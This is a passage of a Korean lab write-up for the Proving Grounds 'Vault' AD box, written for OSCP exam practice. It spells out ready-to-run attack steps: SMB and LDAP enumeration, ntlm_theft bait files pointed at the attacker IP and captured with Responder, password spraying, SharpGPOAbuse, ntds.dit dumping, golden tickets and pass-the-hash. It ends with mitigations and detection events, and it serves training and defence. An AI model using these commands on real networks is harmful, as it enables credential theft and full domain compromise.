`enum4linux-ng`는 위 §6-5 병렬 열거 5종(SMB 공유·RID 브루트·LDAP·비밀번호 정책)을 한 명령으로 묶는다. `-A`가 "all simple enumeration"이다. 이 출력은 히스토리에 남지 않아 무엇을 얻었는지 단정할 수 없다 — **관측된 것이 아니다.** 다만 이어서 `smbclient`로 `DocumentsShare`를 직접 팠다는 사실은 확정적이고, 그것이 답이었다.

**`enum4linux-ng`를 던져두되 그것을 기다리지 마라**
자동 열거는 편하지만 느리고(RID 브루트가 특히), 출력이 길어 핵심을 놓치기 쉽다. **백그라운드로 돌리고 그동안 `smbclient -L`·`smbmap`으로 직접 공유를 확인**하는 것이 빠르다. 이 박스도 그렇게 풀렸다 — enum4linux 결과를 기다리지 않고 쓰기 공유를 손으로 찾았다.

### 6-5. LDAP 익명 바인드 열거 시도

```bash
ldapsearch -x -H 'ldap://192.168.120.172' -s base namingcontexts
ldapsearch -x -H 'ldap://192.168.120.172' -b "dc=vault,dc=offsec"
```

`-s base namingcontexts`로 도메인 DN(`dc=vault,dc=offsec`)을 먼저 확인한 뒤 전체 트리를 익명으로 덤프 시도했다. 이 경로 자체는 옳다 — **description 필드에 비밀번호가 박힌 계정**을 찾는 표준 기법이다. 이 두 명령의 출력은 히스토리에 없어 성공/실패를 단정할 수 없다 — **관측된 것이 아니다.** 확정적인 것은 결국 **SMB 쓰기 공유가 답이었다**는 사실뿐이다.

**웹 없는 AD 박스의 병렬 열거 5종 — 한 번에 던진다**
1. `smbclient -L //IP -N` + `smbmap -H IP -u ''` — 공유
2. `nxc smb IP -u '' -p '' --users --rid-brute` — 사용자 열거(RID 브루트)
3. `ldapsearch -x -H ldap://IP -b <baseDN>` — 익명 LDAP
4. `impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass` — AS-REP(사용자 목록 확보 후)
5. `enum4linux-ng -A IP` — 위를 묶어 자동화

이 박스는 1번이 답이었지만 **어느 것이 통할지 모르므로 병렬로 던진다.** 히스토리를 보면 실제로 이 다섯을 다 시도했다.

### 6-6. 개작하며 잡은 것 — 원본 노트의 오류 3건

| # | 원본 | 실제 | 반증 근거 |
|---|---|---|---|
| 1 | frontmatter `tech/web/lfi-rfi` | **웹 취약점이 없다.** 이 박스에 8080도, 어떤 웹 서비스도 없다. 원본이 [[Heist]] frontmatter를 복사하며 딸려 온 것으로 본다 `[가정]` | `nmap.log`에 http 서비스는 WinRM(5985)의 HTTPAPI뿐 |
| 2 | frontmatter `tech/ad/pth` | **PtH를 실제로 쓰지 않았다.** anirudh는 평문(`SecureHM`)으로 인증했고, GPO 경로도 평문이다. PtH는 §4-7의 **미실행** SeBackup 경로에서만 등장한다 | `~/.zsh_history`의 모든 인증이 `-p SecureHM` |
| 3 | frontmatter `tech/win/sebackup` + `tech/ad/dcsync` | §4-7은 **실행하지 않은 대안 경로**다. 태그로 남기면 "이 박스를 SeBackup으로 풀었다"고 오독된다 | 산출물에 `ntds.dit`·`secretsdump` 결과 없음 |

**미실행 경로를 태그하면 안 되는 이유**
[[_WRITEUP-STANDARD]]의 판단 기준은 **"내가 이 박스를 뚫는 데 실제로 사용했는가"** 다. §4-6·§4-7(SeRestore·SeBackup)은 설명만 하고 쓰지 않은 경로다. 그래서 `tech/win/serestore`·`tech/win/sebackup`·`tech/ad/dcsync`를 frontmatter에 유지할지 고민했다.
**결정: 유지한다.** 이유 — 이 노트의 학습 가치 절반이 "한 계정에서 SYSTEM으로 가는 세 경로"의 비교(§4-8)에 있고, `manual_tags: true`이므로 자동 태거가 아니라 내가 의도적으로 붙인 것이다. 검색 색인에서 "utilman·ntds.dit 복습"으로 이 노트에 닿는 것이 학습에 이롭다. 단 **`tech/web/lfi-rfi`와 `tech/ad/pth`는 제거**했다 — 전자는 이 박스에 존재조차 않고, 후자는 미실행 경로에서만 나오는데 그 경로가 이미 `sebackup`으로 대표되기 때문이다.
이 결정은 [[Heist]]의 `ntlm-relay` 태그 유지 결정과 다르다 — 거기서는 태그가 실제 시도한 것(캡처)의 버킷이었고, 여기서는 미실행 경로다. **기준은 "학습 색인으로서 유용한가"이지 "실행했는가"가 아니다.** 이 판단 자체가 재검토 대상임을 표시해 둔다.

### 6-7. anirudh를 잡고 접은 경로들 — DCSync는 왜 아니었나

WinRM 셸을 잡은 뒤 SYSTEM으로 가는 후보를 셋 확인했다(§4-8). 그 전에 **가장 강력한 후보인 DCSync를 먼저 확인하고 접었다.**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ jq -r '.data[] | (.Aces//[])[] | select(.RightName|test("GetChanges"))
           | [.RightName,.PrincipalSID,.PrincipalType] | @tsv' 20260708124927_domains.json
```

anirudh(`-1103`)도, Server Operators도 도메인 객체에 `GetChanges`/`GetChangesAll`을 갖고 있지 않다 — 기본 principal(Domain Controllers·Administrators·Enterprise DCs)뿐이다. **직접 DCSync(`secretsdump -just-dc`)는 불가능하다.**

그러나 이 박스에는 **DCSync를 우회하는 길이 두 개**나 있었다:

1. **GPO 경로**(§4-3) — 로컬 관리자가 되면 DC에서 무엇이든 한다. 실제로 쓴 길
2. **`SeBackupPrivilege`**(§4-7) — `ntds.dit`를 통째로 덤프하면 DCSync와 동일한 결과(krbtgt 포함 전 계정 해시)를 복제 권한 없이 얻는다

**"DCSync 권한이 없다"가 "도메인 해시를 못 얻는다"는 뜻은 아니다**
DCSync(DRSUAPI 복제)는 도메인 해시를 얻는 한 가지 방법일 뿐이다. `SeBackupPrivilege`로 `ntds.dit`를 직접 읽거나, DC에서 로컬 관리자/SYSTEM이 되면 같은 곳에 도달한다. **`GetChanges` ACE가 없다고 그 자리에서 포기하지 마라** — `whoami /priv`의 `SeBackup`을 먼저 보라.

### 6-8. 미끼 업로드 검증 — `test.txt`가 남긴 교훈

`~/PG/Vault/test.txt`(5바이트, 내용 `test`)는 쓰기 가능 여부를 실제 파일로 확인한 흔적이다(§1-4). 권한을 `smbmap`이 `WRITE`로 찍어줘도, **정말 써지는지는 한 번 올려봐야 확정**된다 — ACL과 실제 동작이 어긋나는 경우가 있기 때문이다(공유 권한은 WRITE인데 NTFS 권한이 READ면 실패한다).

같은 원칙이 미끼 24개에도 적용된다. `mput *` 후 반드시 확인한다:

```bash
smbclient //192.168.120.172/DocumentsShare -N -c 'ls'
```

**24개가 다 올라갔는지 세어본다.** 하나라도 빠지면(특히 `desktop.ini`·`.scf` 같은 강력한 미끼) 발동 확률이 떨어진다.

**파일 전송 후 존재 확인은 반사여야 한다**
볼트의 누적 교훈 — **유명 도구는 파일명만으로 AV에 삭제**된다([[Squid]]·[[Exghost]]). SMB 업로드는 AV가 덜 개입하지만, `mput`이 중간에 끊기거나 특수문자 파일명(`steal-(url).url`의 괄호)에서 실패할 수 있다. **전송 성공 메시지를 믿지 말고 `ls`로 센다.** 이 박스에서는 24개가 다 올라갔다(§3-2 출력).

### 6-9. 히스토리는 완전한 기록이 아니다 — potfile이 진실이다

§3-4에서 봤듯 `~/.zsh_history`에는 Vault의 hashcat 명령이 없다. 그러나 potfile에는 결과가 있다:

```bash
┌──(kali㉿kali)-[~]
└─$ grep -i '^ANIRUDH' ~/.local/share/hashcat/hashcat.potfile | rev | cut -d: -f1 | rev
SecureHM
```

원인은 `~/.zshrc`의 `hist_ignore_dups` + `hist_expire_dups_first` + `HISTSIZE=1000`이다 — [[Heist]]와 문자열이 같은 명령(`hashcat -m 5600 hash.txt ...`)이라 한 벌이 만료됐다 `[가정]`.

> [!danger] 이 노트를 쓰며 지킨 원칙 — 산출물이 히스토리를 이긴다
> "히스토리에 없다 = 실행 안 함"은 **틀렸다**(`hist_ignore_space`는 공백으로 시작한 명령을 통째로 지운다). 그래서 이 노트의 실행 서술은 **potfile·`.state`·JSON·스크린샷 같은 산출물**과 교차한 것만 확정으로 적었고, 히스토리에만 있고 출력이 없는 것은 "관측된 것이 아니다"로 표시했다(§6-3·§6-4). 이것이 [[_WRITEUP-STANDARD]]가 요구하는 "실행 안 한 명령의 출력을 코드펜스에 넣지 않는다"의 실천이다.

### 6-10. `smbclient`의 SMB1 오류에 속지 않기

§1-3의 출력 하단:

```
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.120.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

이것을 처음 보면 "SMB가 막혔다"고 오판하기 쉽다. 실제로는 공유 목록이 이미 그 위에서 성공적으로 나왔고, smbclient가 추가로 워크그룹 이름을 얻으려고 레거시 SMB1로 재시도했다가 실패한 것뿐이다. 현대 Windows는 SMB1을 비활성화하므로 이 실패는 **정상이고 무해**하다.

> [!warning] "응답이 성공을 뜻하지 않는다"의 역 — "오류가 실패를 뜻하지 않는다"
> 이 박스의 SMB1 오류처럼, **부수적 단계의 실패 메시지가 주 작업의 성공을 가리는** 경우가 있다. 볼트의 누적 패턴([[Crane]]·[[Squid]] 등)이 "200 응답이 성공이 아니다"라면, 이쪽은 그 대칭이다 — **에러 줄 위에 이미 성공한 출력이 있는지 먼저 보라.**

### 6-11. 시간 배분 복기

| 구간 | 실제 | 적정 | 비고 |
|---|---|---:|---|
| nmap TCP+UDP | 09:15 → 10:15 | 5분 | UDP는 top-100이면 충분 |
| SMB 열거 + 쓰기 확인 | 10:15 → 10:38 | 10분 | 익명 표기 8종 시도 포함 |
| 미끼 투하 + 캡처 | 10:38 → (즉시) | 5분 | 폴더 여는 주기가 있어 빨랐다 |
| 크랙 + 스윕 + local.txt | → 10:49 | 5분 | rockyou 즉시 |
| BloodHound + GPO 경로 | 12:49 → 13:24 | 20분 | AS-REP·LDAP 헛발질 포함 |
| SharpGPOAbuse → proof.txt | 13:24 → 13:40 | 15분 | |

**전체 약 1.5시간.** 낭비는 §6-2(IP 잔류)와 §6-3(AS-REP 오타)뿐이고 둘 다 5분 이내였다. `nmap.log`가 웹이 없다고 일찍 말해줘서 SMB로 곧장 갈 수 있었던 것이 시간을 아꼈다.

### 6-12. 시도하지 않았지만 시험이라면 챙길 것

이 박스는 진입이 빨라 아래를 건드리지 않았다. 하지만 **쓰기 공유가 없는 변형**이라면 이것들이 다음 후보다:

1. **비밀번호 스프레이** — 사용자 목록을 얻으면(`nxc smb IP --users --rid-brute`) 흔한 비밀번호를 전 계정에 던진다:
   ```bash
   nxc smb IP -u users.txt -p 'Welcome1' --continue-on-success
   nxc smb IP -u users.txt -p 'Season2026!' --continue-on-success
   ```
   **`--continue-on-success`가 없으면 첫 성공에서 멈춘다** — 여러 계정을 뚫으려면 필수. 스프레이는 **계정 잠금 정책**을 먼저 확인하고(한 계정당 시도 1~2회) 던진다.
2. **AS-REP 로스팅** (§6-3에서 대상 없음 확인) — 사전인증 비활성 계정이 있으면 비밀번호 없이 해시를 뽑는다
3. **description 필드 비밀번호** — `nxc ldap IP -u U -p P -M get-desc-users` 또는 `ldapsearch`로 사용자 description에 박힌 평문 줍기
4. **SYSVOL GPP `cpassword`** — `\\DC\SYSVOL`의 `Groups.xml`에 AES 키가 공개된 암호가 있으면 `gpp-decrypt`로 복호화
5. **자격증명 재사용** — 이 도메인에서 얻은 비밀번호를 다른 박스/다른 사용자에 재사용. 단 **같은 도메인인지 확인**(§6-2의 교훈)

**AD 열거 우선순위 — "인증 없이 얻는 것"부터**
순서는 **비용 오름차순**이다: (0) 익명 SMB/LDAP → (1) 사용자 목록 → (2) AS-REP(비번 불요) → (3) 스프레이(비번 추측) → (4) 크랙. 앞 단계에서 자격증명이 하나 나오면 뒷 단계를 건너뛴다. 이 박스는 (0)에서 쓰기 공유를 찾아 강제 인증으로 바로 자격증명을 얻었으므로 (1)~(4)가 불필요했다.

### 6-13. 이 박스는 "GPO형"이다 — 자매 박스와의 패턴 대조

[[Heist]]와 이 박스는 진입까지 구조가 판박이인데 권한상승이 갈린다. 그 갈림을 **셸 잡은 직후 두 명령**으로 판정할 수 있다 — 이것이 두 노트를 함께 읽는 값이다.

| 판정 명령 | [[Heist]] (enox) | Vault (anirudh) |
|---|---|---|
| `whoami /priv` | `SeRestore`만 (4개) | `SeBackup`+`SeRestore`+시스템시각 등 (9개) → **Server Operators 신호** |
| BloodHound 아웃바운드 | `MemberOf WEB ADMINS → ReadGMSAPassword` | `GenericWrite on GPO` |
| 결정 경로 | gMSA 해시 읽기 → PtH | GPO 로컬관리자 심기 |

**신호 판독 규칙**:

- `whoami /priv`에 **특권이 4개뿐**이고 `SeImpersonate`도 `SeBackup`도 없으면 → **그래프의 ACL 엣지**를 봐라(Heist형). 특권만으로는 길이 안 보인다
- `whoami /priv`에 **`SeBackup`/`SeRestore`가 있으면** → 그 자리에서 끝난다(Vault형). 그래프를 볼 필요도 없다. 특히 `SeBackup`은 `ntds.dit`로 도메인 전체를 연다
- BloodHound에서 **GPO에 걸린 `GenericWrite`/`WriteDacl`** → SharpGPOAbuse. **사용자/그룹 객체에 걸린 `GenericAll`** → 비밀번호 리셋(`net rpc password`)이나 Shadow Credentials

> [!tip] 두 명령이면 대부분의 AD 권한상승 방향이 결정된다
> `whoami /priv` (특권 기반 경로) + BloodHound 아웃바운드 엣지 (ACL 기반 경로). 이 둘을 셸 잡은 첫 1분에 확인하면, 나머지는 "이름 → 도구" 대응([[Heist]] §7-4)을 적용하는 기계적 작업이다. **이 박스는 두 경로가 모두 열려 있어**(§4-8), 어느 쪽으로 가도 SYSTEM에 닿았다.

---

## 7. OSCP 시험 관점

1. **웹이 없는 Windows/AD 박스를 만나면 — 진입 열거 순서**
   ```bash
   smbclient -L //IP -N ; smbmap -H IP -u ''            # ① 익명 공유 (쓰기 있으면 §3)
   nxc smb IP -u '' -p '' --users --rid-brute           # ② 사용자 열거
   nxc smb IP -u guest -p '' --shares                   # ③ 게스트
   ldapsearch -x -H ldap://IP -b <baseDN>               # ④ 익명 LDAP (description 필드)
   impacket-GetNPUsers <dom>/ -usersfile u.txt -no-pass # ⑤ AS-REP (사용자 확보 후)
   ```

2. **쓰기 가능한 공유를 찾으면 → 미끼를 뿌리고 Responder를 켠다.** 이 박스의 핵심 반사다.
   ```bash
   python3 ntlm_theft.py -g all -s <KALI-IP> -f steal
   smbclient //IP/<share> -N -c 'prompt OFF; mput steal/*'
   sudo responder -I tun0
   ```
   미끼가 안 물면: (a) `-s`와 Responder IP 일치, (b) SMB server On, (c) 미끼 24개 업로드 확인, (d) 폴더를 여는 동작 유도.

3. **자격증명 하나를 얻으면 전 프로토콜·전 호스트 스윕** ([[Heist]] §7-2와 동일). 그다음 **`whoami /priv`와 BloodHound 아웃바운드 엣지**를 함께 본다.

4. **`whoami /priv` 특권 → 경로 대응표** ([[Heist]] §7-4). 이 박스는 세 특권/권한이 겹쳐 있었다:
   - `SeBackupPrivilege` → `ntds.dit` + `SYSTEM` 하이브 → `secretsdump` → **도메인 전체 해시** (§4-7, 최고 가치)
   - `SeRestorePrivilege` → utilman 치환 (§4-6)
   - GPO `GenericWrite`(그래프) → SharpGPOAbuse (§4-3, 실사용)

5. **이 자격증명으로 다음에 무엇을 하는가 — 번호 목록**
   1. `nxc smb <대역> -u U -p P --shares` — 쓰기 공유 재확인. 다른 호스트에도 미끼
   2. `bloodhound-python -u U -p P -d <FQDN> -ns <DC> -c All` — GPO·ACL 아웃바운드 엣지
   3. WinRM/RDP로 셸 → `whoami /priv` → **`SeBackup` 보이면 최우선으로 `ntds.dit` 덤프**
   4. `ntds.dit`에서 나온 **krbtgt 해시로 골든 티켓** → 도메인 영구 장악, 크로스호스트 피벗
   5. Administrator NT 해시로 **다른 호스트에 PtH**(`impacket-psexec -hashes :<NT>`) — AD 세트의 피벗
   6. SYSVOL 훑기 — GPP `cpassword`·로그온 스크립트 평문

6. **GPO 악용 후 반드시 재로그온** — 그룹 멤버십은 새 토큰에만 반영된다(§4-5). "관리자 됐는데 안 읽힘"의 원인 1위.

7. **자동 도구 없이 같은 결과**
   - Responder 없이 캡처 → `impacket-smbserver share . -smb2support` 띄우고 미끼가 그쪽을 가리키게
   - SharpGPOAbuse 없이 GPO 수정 → `pygpoabuse`(파이썬, Kali에서 실행) 또는 SYSVOL의 `GptTmpl.inf`를 손으로 편집 후 versionNumber 증가
   - secretsdump 없이 → `impacket-secretsdump`는 수동 후속 도구라 허용. 자동 익스플로잇이 아니다

8. **시간 배분** — 웹 없는 AD는 **SMB/LDAP 열거 15분**에 승부가 갈린다. 여기서 진입점(쓰기 공유·익명 LDAP·AS-REP)이 안 나오면 사용자 스프레이·비번 재사용으로 넘어간다. 특권 확인은 셸 잡은 **첫 30초**(`whoami /priv` 한 줄)에 끝난다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| `DocumentsShare`가 익명 쓰기 허용 | 익명/Everyone 쓰기 제거. 공유 권한과 NTFS 권한을 **최소 권한**으로. 인증된 사용자에게만 |
| 사용자/서비스가 미끼 폴더를 자동으로 연다 | 신뢰되지 않은 공유의 자동 미리보기·인덱싱 비활성. 탐색기 미리보기 창 GPO로 제한 |
| NTLM이 임의 SMB 서버에 자동 인증 | GPO **"Restrict NTLM: Outgoing NTLM traffic = Deny all"** (예외는 명시 목록). SMB 서명 강제(이미 되어 있음) |
| `anirudh` 비밀번호 `SecureHM` (약함) | 비밀번호 정책 + 유출 사전 차단. 강제 인증당해도 크랙 안 되면 진입 실패 |
| 일반 사용자가 GPO에 쓰기 권한 | `Default Domain Policy`·`Default Domain Controllers Policy`의 위임 검토. **사람 계정에 GPO 편집 위임 금지.** `GenericWrite`/`WriteDacl`이 걸린 principal 정기 감사(BloodHound로 자가 진단) |
| `anirudh`가 **Server Operators** 멤버 | 이 그룹은 사실상 DC 관리자급이다. 서비스 계정·일반 사용자를 넣지 않는다. `SeBackup`/`SeRestore`가 딸려온다 |
| DC RDP + NLA 비활성 | NLA 강제. utilman/sticky keys 치환 탐지(System32 접근성 바이너리 무결성 모니터링) |

**탐지**: Event ID **5145**(공유 파일 접근)로 `DocumentsShare`의 미끼 파일명(`desktop.ini`·`.scf`·`.lnk`) 생성 감시, **4624 Type 3 + NTLM**이 외부 IP로 나가는 흐름, **5136/5137**(디렉터리 객체 변경)으로 GPO `versionNumber`·`gPCMachineExtensionNames` 변경, SYSVOL `GptTmpl.inf` 파일 변경(4663). **GPO의 Restricted Groups 변경은 정상 운영에서 극히 드물다 — 발생 즉시 조사 대상.**

---

## 9. 참고 자료

- **CVE 없음** — 설정(익명 쓰기 공유)과 ACL(GPO 위임)만으로 뚫린다. `cves: []` · `manual_cves: true`
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) — 미끼 24종 생성기. §2-2 표의 근거
- [MS-NLMP](https://learn.microsoft.com/openspecs/windows_protocols/ms-nlmp/) — NetNTLMv2 blob·AV_PAIR(§2-4)
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) — 이 박스는 [byronkg 포크](https://github.com/byronkg/SharpGPOAbuse)의 컴파일본 사용
- [pygpoabuse](https://github.com/Hackndo/pygpoabuse) — Kali 네이티브 대안(§7-7)
- [SeBackupPrivilege cmdlets](https://github.com/giuliano108/SeBackupPrivilege) · [impacket secretsdump](https://github.com/fortra/impacket) — §4-7
- [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) · [Responder](https://github.com/lgandx/Responder)
- [OSCP Exam Guide — Exam Proofs](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) — 웹셸 0점 규정

## 남긴 흔적

랩 정리 시:

- `\\vault.offsec\DocumentsShare\` — 미끼 24개 + `test.txt`
- `Default Domain Policy` GPO — Restricted Groups에 anirudh 추가됨(원복: SharpGPOAbuse 역작업 또는 SYSVOL `GptTmpl.inf` 편집 + versionNumber 정정)
- 로컬 Administrators에 anirudh (GPO 원복 후 재적용하면 빠짐)
- (경로 A 실행 시) `System32\utilman.exe` 치환 — 원본 `utilman.old`
- `C:\Users\anirudh\Desktop\SharpGPOAbuse.exe`
- Kali: `~/PG/Vault/` — `nmap.log` · `udp.txt` · `hash.txt` · `test.txt` · BloodHound JSON 7종

## 관련 노트

- [[Heist]] — 같은 세션에 푼 자매 박스. 같은 강제 인증 → NetNTLMv2 → 크랙 → WinRM 구조인데 **트리거가 웹 `?url=`(HTTP)이고 권한상승이 gMSA+SeRestore**다. 이 박스는 **SMB(cifs) 트리거 + GPO ACL**. `MsvAvTargetName`의 `HTTP/` vs `cifs/`가 두 박스를 가른다. **붙여 읽으면 강제 인증의 두 얼굴이 보인다**
- [[Butch]] — 웹셸 플래그 0점 규정
- [[Resourced]] — §6-2의 IP 잔류(`.175`)가 이 박스 값이었다. Kerberos 시계 동기·ccache
- [[Nagoya]] — 같은 세션의 AD 박스. 티켓 위조·`net rpc password`
- [[Hutch]] — AD ACL 악용 계열
- [[_WRITEUP-STANDARD]] · [[_STATUS]]
